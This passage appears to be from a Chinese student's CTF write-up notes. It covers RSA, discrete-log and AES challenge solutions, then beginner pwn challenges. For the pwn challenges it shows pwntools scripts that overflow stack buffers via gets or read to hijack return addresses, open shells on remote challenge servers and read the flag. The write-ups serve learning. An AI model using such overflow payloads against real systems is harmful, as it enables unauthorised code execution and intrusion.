(gmpy2.gcd(e2, (p - 1) * (q2 - 1)))print(gmpy2.gcd(e1, (p - 1) * (q1 - 1)))e1 = e1 // 14e2 = e2 // 14d1 = gmpy2.invert(e1, (p - 1) * (q1 - 1))d2 = gmpy2.invert(e2, (p - 1) * (q2 - 1))nn = []aa = []nn.append(q1)nn.append(q2)a1 = gmpy2.powmod(c1, d1, p * q1) % q1a2 = gmpy2.powmod(c2, d2, p * q2) % q2aa.append(a1)aa.append(a2)def exCRT_getequation(a, n):    a1 = a[0]    n1 = n[0]    le = len(a)    for i in range(1, le):        a2 = a[i]        n2 = n[i]        if not merge(a1, n1, a2, n2):            return -1        a1 = a3        n1 = n3    return (a1, n1)m14, n = exCRT_getequation(aa, nn)  # 最终方程组 aa=n^14%q1*q2m2 = pow(m14, gmpy2.invert(7, (q1 - 1) * (q2 - 1)), n)print(long_to_bytes(gmpy2.isqrt(m2)))# de1ctf{9b10a98b-71bb-4bdf-a6ff-f319943de21f}

[QCTF2018]Xman-RSA

纳尼，没给出加密脚本？哦，原来是加密脚本也加密了。。。

看起来第一步是进行词频分析呀，这么大的内容

把第一个再拿出来改一改就行了。

from gmpy2 import is_primefrom os import urandomimport base64def bytes_to_num(b):    return int(b.encode('hex'), 16)def num_to_bytes(n):    b = hex(n)[2:-1]    b = '0' + b if len(b) % 2 == 1 else b    return b.decode('hex')def get_a_prime(l):    random_seed = urandom(l)    num = bytes_to_num(random_seed)    while True:        if is_prime(num):            break    num += 1    return numdef encrypt(s, e, n):    p = bytes_to_num(s)    p = pow(p, e, n)    return num_to_bytes(p).encode('hex')def separate(n):    p = n % 4    t = (p * p) % 4    return t == 1f = open('flag.txt', 'r')flag = f.read()msg1 = ""msg2 = ""for i in range(len(flag)):    if separate(i):        msg2 += flag[i]    else:        msg1 += flag[i]p1 = get_a_prime(128)p2 = get_a_prime(128)p3 = get_a_prime(128)n1 = p1 * p2n2 = p1 * p3e = 0x1001c1 = encrypt(msg1, e, n1)c2 = encrypt(msg2, e, n2)print(c1)print(c2)e1 = 0x1001e2 = 0x101p4 = get_a_prime(128)p5 = get_a_prime(128)n3 = p4 * p5c1 = num_to_bytes(pow(n1, e1, n3)).encode('hex')c2 = num_to_bytes(pow(n1, e2, n3)).encode('hex')print(c1)print(c2)print(base64.b64encode(num_to_bytes(n2)))print(base64.b64encode(num_to_bytes(n3)))

然后就是分析了，脚本很简单，先共模攻击获得n1，然后n2也可以有了，然后有msg1、msg2，然后根据他的分离的判定条件将两部分msg合并一下就行了。

import base64import gmpy2from Crypto.Util.number import long_to_bytes, bytes_to_long"""def bytes_to_num(b):    return int(b.encode('hex'), 16)def num_to_bytes(n):    b = hex(n)[2:-1]    b = '0' + b if len(b) % 2 == 1 else b    return b.decode('hex')def get_a_prime(l):    random_seed = urandom(l)    num = bytes_to_num(random_seed)    while True:        if is_prime(num):            break    num += 1    return numdef encrypt(s, e, n):    p = bytes_to_num(s)    p = pow(p, e, n)    return num_to_bytes(p).encode('hex')def separate(n):    p = n % 4    t = (p * p) % 4    return t == 1f = open('flag.txt', 'r')flag = f.read()msg1 = ""msg2 = ""for i in range(len(flag)):    if separate(i):        msg2 += flag[i]    else:        msg1 += flag[i]p1 = get_a_prime(128)p2 = get_a_prime(128)p3 = get_a_prime(128)n1 = p1 * p2n2 = p1 * p3e = 0x1001c1 = encrypt(msg1, e, n1)c2 = encrypt(msg2, e, n2)print(c1)print(c2)# 下面的对n1加密，使用相同的n3，不同的e，可以使用共模攻击来打。e1 = 0x1001e2 = 0x101p4 = get_a_prime(128)p5 = get_a_prime(128)n3 = p4 * p5c1 = num_to_bytes(pow(n1, e1, n3)).encode('hex')c2 = num_to_bytes(pow(n1, e2, n3)).encode('hex')print(c1)print(c2)print(base64.b64encode(num_to_bytes(n2)))print(base64.b64encode(num_to_bytes(n3)))"""with open('n2&n3', 'r') as file:    data = file.read().split('\n')    n2 = bytes_to_long(base64.b64decode(data[0]))    n3 = bytes_to_long(base64.b64decode(data[1]))with open('n1.encrypted', 'r') as file:    data = file.read().split('\n')    c1 = int('0x' + data[0], 16)    c2 = int('0x' + data[1], 16)e = 0x1001e1 = 0x1001e2 = 0x101n = n3def ext_euclid(a, b):    if b == 0:        return 1, 0, a    else:        x, y, q = ext_euclid(b, a % b)  # q = gcd(a, b) = gcd(b, a%b)        x, y = y, (x - (a // b) * y)        return x, y, qdef same_mod(n, e1, e2, c1, c2):    s, t, q = ext_euclid(e1, e2)    n1 = (gmpy2.powmod(c1, s, n) * gmpy2.powmod(c2, t, n)) % n  # powmod进行大数运算    print('n1 =', n1)    return n1n1 = same_mod(n, e1, e2, c1, c2)print('n2 =', n2)p1 = gmpy2.gcd(n1, n2)p2 = n1 // p1p3 = n2 // p1phi1 = (p1-1) * (p2-1)phi2 = (p1-1) * (p3-1)d1 = gmpy2.invert(e, phi1)d2 = gmpy2.invert(e, phi2)with open('ciphertext', 'r') as file:    data = file.read().split('\n')    c1 = int('0x' + data[0], 16)    c2 = int('0x' + data[1], 16)msg1 = str(long_to_bytes(pow(c1, d1, n1)))[2:len(str(long_to_bytes(pow(c1, d1, n1)))) - 3]msg2 = str(long_to_bytes(pow(c2, d2, n2)))[2:len(str(long_to_bytes(pow(c2, d2, n2)))) - 1]def separate(n):    p = n % 4    t = (p * p) % 4    return t == 1flag = ''f1 = 0f2 = 0for i in range(len(msg1) + len(msg2)):    if separate(i):        flag += msg2[f2]        f2 += 1    else:        flag += msg1[f1]        f1 += 1print(flag)# XMAN{CRYPT0_I5_50_Interestingvim rsa.py}

[NPUCTF2020]认清形势，建立信心

给出的题目的脚本为

from Crypto.Util.number import *from gmpy2 import *from secret import flagp = getPrime(25)e = # Hiddenq = getPrime(25)n = p * qm = bytes_to_long(flag.strip(b"npuctf{").strip(b"}"))c = pow(m, e, n)print(c)print(pow(2, e, n))print(pow(4, e, n))print(pow(8, e, n))'''169169912654178128509160179202518818742414340358553002064450'''

根据第二、三、四的内容可以很简单地求得n、e，解题脚本如下

from Crypto.Util.number import *import gmpy2import sympy"""p = getPrime(25)e = # Hiddenq = getPrime(25)n = p * qm = bytes_to_long(flag.strip(b"npuctf{").strip(b"}"))c = pow(m, e, n)print(c)print(pow(2, e, n))print(pow(4, e, n))print(pow(8, e, n))"""c = 169169912654178c2 = 128509160179202c4 = 518818742414340c8 = 358553002064450n = gmpy2.gcd(c2*c4 - c8, c2 ** 2 - c4)# 1054494004042394<16> = 2 · 18195301 · 28977097p = 28977097q = 18195301n = p*qphi = (p-1)*(q-1)d = 1e = sympy.discrete_log(n, c2, 2)print(e)d = gmpy2.invert(e, phi)m = pow(c, d, n)print(long_to_bytes(m))"""808723997b'345y!'npuctf{345y!}"""

求e可以使用离散对数问题的求解获得。

离散对数问题

基于离散对数问题的困难问题构造的密码，离散对数问题既是高中时的log问题，幂的逆问题。

一般离散对数问题

[网鼎杯 2020 青龙组]you_raise_me_up

给出的脚本为

#!/usr/bin/env python# -*- coding: utf-8 -*-from Crypto.Util.number import *import randomn = 2 ** 512m = random.randint(2, n-1) | 1c = pow(m, bytes_to_long(flag), n)print 'm = ' + str(m)print 'c = ' + str(c)# m = 391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075# c = 6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499

m是取的随机数，但是最后给出来了，那这个问题就落在了下面的这条语句上面了

c = pow(m, bytes_to_long(flag), n)

既

此时欲求得flag，sympy是有专门的函数的，这个函数的用法是flag = sympy.discrete_log(n, c, m)，如此即可求得flag。

故写解题脚本如下所示

from Crypto.Util.number import *import sympyn = 2 ** 512m = 391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075c = 6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499flag = sympy.discrete_log(n, c, m)print(long_to_bytes(flag))# b'flag{5f95ca93-1594-762d-ed0b-a9139692cb4a}'

对称加密

AES

[ACTF新生赛2020]crypto-aes

给出的脚本大概就像是这样的，

from Crypto.Cipher import AESimport osimport gmpy2from Crypto.Util.number import *def main():    key = os.urandom(2) * 16    iv = os.urandom(16)    print(bytes_to_long(key) ^ bytes_to_long(iv))    aes = AES.new(key, AES.MODE_CBC, iv)    enc_flag = aes.encrypt(b'FLAG'*4)    print(enc_flag)if __name__ == "__main__":    print(os.urandom(2))    main()

这里为什么随机的key和iv我们仍然是可以破解的呢？因为这个key是两个byte的重复，而且给出了key和iv的按位异或的值。并且这个异或是从右向左异或的，key的长度大于iv的长度，所以前面的很多位来说，异或后的值是等于key的，故此可得key、iv，亦可解密。

from Crypto.Cipher import AESimport osimport gmpy2from Crypto.Util.number import *key_iv = 91144196586662942563895769614300232343026691029427747065707381728622849079757enc_flag = b'\x8c-\xcd\xde\xa7\xe9\x7f.b\x8aKs\xf1\xba\xc75\xc4d\x13\x07\xac\xa4&\xd6\x91\xfe\xf3\x14\x10|\xf8p'key = long_to_bytes(key_iv)[:2] * 16iv = key_iv ^ bytes_to_long(key)iv = long_to_bytes(iv)aes = AES.new(key, AES.MODE_CBC, iv)flag = aes.decrypt(enc_flag)print(flag)# b'actf{W0W_y0u_can_so1v3_AES_now!}'

PWN

环境配置

kali配置安装pwn环境

安装peda

我先安装的是peda，直接就两个命令，下面的两个命令

git clone https://github.com/longld/peda.git ~/pedaecho "source ~/peda/peda.py" >> ~/.gdbinit

直接gdb命令出现的就是peda的前缀了。

对pwn的难度估计出现了重大失误，这个门槛还是很高的，等下学期学了病毒分析再入门吧。

一般pwn

绝对签到题

buu、test_your_nc

直接nc就行了，这个主要是好像pwn里面经常是要使用nc工具的。

nc node3.buuoj.cn 28024cat /flag

普通溢出题目

普通栈溢出

rip

使用64位的ida解决。

// main函数的反汇编代码如下int __cdecl main(int argc, const char **argv, const char **envp){  char s[15]; // [rsp+1h] [rbp-Fh] BYREF  puts("please input");  gets((__int64)s, (__int64)argv);  puts(s);  puts("ok,bye!!!");  return 0;}

据判断，gets函数具有栈溢出漏洞

s的大小限制为15位(F - 0 = F[F为10进制的15])，只要传入超过15个byte就会导致溢出，然后转到system函数(程序中的fun函数里面有system方法)，然后就再看看ida里面他的函数的开始地址0x401186

然后就认为我们的payload可以为如下

b"a" * 15 + p64(0x401186)

p64代表的是这个地址是64位机的地址pack 64 bits number。

p32/p64: 打包一个整数，分别打包为32位或64位u32/u64: 解包一个字符串，得到整数

然后写脚本如下

# coding=utf-8from pwn import *p = remote('node4.buuoj.cn', 27897)buf_1 = b"a" * 15 + p64(0x401186)p.sendline(buf_1)p.sendline("cat /flag".encode())# flag{42bfbcd2-053e-4a41-8581-3a8e676a4c9a}

warmup_csaw_2016

TAG：gets栈溢出漏洞，后门函数

听说大家ida打开之前都会使用checksec来检查一下应用程序是否是有保护的，这里的checksec是可以直接下的，但是好像某个工具里面自带的也是有的，这里为了方便，先直接sudo apt install checksec来下载一下这个工具。

然后就是直接看ida了，main函数的内容为

__int64 __fastcall main(int a1, char **a2, char **a3){  char s[64]; // [rsp+0h] [rbp-80h] BYREF  char v5[64]; // [rsp+40h] [rbp-40h] BYREF  write(1, "-Warm Up-\n", 0xAuLL);  write(1, "WOW:", 4uLL);  sprintf(s, "%p\n", sub_40060D);  write(1, s, 9uLL);  write(1, ">", 1uLL);  return gets(v5);}

应该是最后的这个v5的大小限制导致栈溢出的，然后再去看v5的容量为

-0000000000000040 var_40          db 64 dup(?)+0000000000000000  s              db 8 dup(?)

是这个，80-40=40(十六进制)还要加上返回地址的8个字节，这里应该说的是return所造成的8个字节的返回地址。

估计就是64位的机器，然后一个字节等于8个位，所以64位=8×8位。就是8个字节。(猜想的，现在还不是很明白)

然后就可以写出利用方式如下所示

# coding=utf-8from pwn import *p = remote('node4.buuoj.cn', 28074)buf_1 = b"a" * 0x48 + p64(0x40060d)p.sendline(buf_1)p.interactive()# flag{02912f3b-c4e0-4a24-9f51-30a93e017b04}

又是一道水题，并没学到更高深的东西。

ciscn_2019_n_1

TAG: gets栈溢出，满足条件

又是一道gets的题，找到关键处的代码为

int func(){  int result; // eax  char v1[44]; // [rsp+0h] [rbp-30h] BYREF  float v2; // [rsp+2Ch] [rbp-4h]  v2 = 0.0;  puts("Let's guess the number.");  gets(v1);  if ( v2 == 11.28125 )    result = system("cat /flag");  else    result = puts("Its value should be 11.28125");  return result;}

满足v2 == 11.28125即可获得flag，先看总的容量为0x30个字节的大小。

然后是将空间分成的是v1和v2两个部分，共是0x30，v2的大小为0x4。目标就是把v2这一块空间内的数据写成11.28125转为十六进制是0x41348000。

然后利用脚本就是下面的

# coding=utf-8from pwn import *p = remote('node4.buuoj.cn', 27852)buf_1 = b"a" * (0x30 - 0x4) + p64(0x41348000)p.sendline(buf_1)p.interactive()# flag{652624f4-f9cc-498c-a675-42a5143e9b49}

pwn1_sctf_2016

TAG: 替换字符造成栈溢出

这个对gets到的字符的个数有了限制，但是strcpy(s, v0);，v0可控似乎是，下面是反汇编出来的主要的c代码，说实话我没怎么看懂。

int vuln(){  const char *v0; // eax  char s[32]; // [esp+1Ch] [ebp-3Ch] BYREF  char v3[4]; // [esp+3Ch] [ebp-1Ch] BYREF  char v4[7]; // [esp+40h] [ebp-18h] BYREF  char v5; // [esp+47h] [ebp-11h] BYREF  char v6[7]; // [esp+48h] [ebp-10h] BYREF  char v7[5]; // [esp+4Fh] [ebp-9h] BYREF  printf("Tell me something about yourself: ");  fgets(s, 32, edata);  std::string::operator=(&input, s);  std::allocator<char>::allocator(&v5);  std::string::string(v4, "you", &v5);  std::allocator<char>::allocator(v7);  std::string::string(v6, "I", v7);  replace((std::string *)v3);  std::string::operator=(&input, v3, v6, v4);  std::string::~string(v3);  std::string::~string(v6);  std::allocator<char>::~allocator(v7);  std::string::~string(v4);  std::allocator<char>::~allocator(&v5);  v0 = (const char *)std::string::c_str((std::string *)&input);  strcpy(s, v0);  return printf("So, %s\n", s);}

这里网上的教程说是前面间接有个对传入的内容有一个把I换成you的替换操作，这里就可以间接地造成栈溢出，感觉就像是web里面的php反序列化的字符逃逸，然后看看s的空间分配的大小是0x3c

然后0x3c = 16x3+12 = 60，传入20个I即可，可写payload如下

# coding=utf-8from pwn import *p = remote('node4.buuoj.cn', 25512)buf_1 = b"I" * 20 + b"a" * 4 + p64(0x08048F0D)  # 好像是因为32位的返回地址是4个字节，需要填充4个字符ap.sendline(buf_1)p.interactive()# flag{3ef70652-fbd5-4ee2-a6d0-b94061892eb1}

缓冲区溢出

jarvisoj_level0

TAG: read造成buf缓冲区溢出

看有的wp说是read函数造成缓冲区溢出，下面是主要的代码

ssize_t vulnerable_function(){  char buf[128]; // [rsp+0h] [rbp-80h] BYREF  return read(0, buf, 0x200uLL);}

然后这个buf的大小是0x80也就是十进制的128，然后缓冲区溢出就是将栈的返回地址改成后门函数的地址，注意到数据栈的返回地址(r)是0x8

然后后门函数的地址为0x400596

所以利用方式如下所示

# coding=utf-8from pwn import *p = remote('node4.buuoj.cn', 25015)buf_1 = b"a" * (0x80 + 0x8) + p64(0x400596)p.sendline(buf_1)p.interactive()# flag{3d0a1531-3486-4d69-aa6a-010088aa45bf}

ciscn_2019_c_1

TAG:
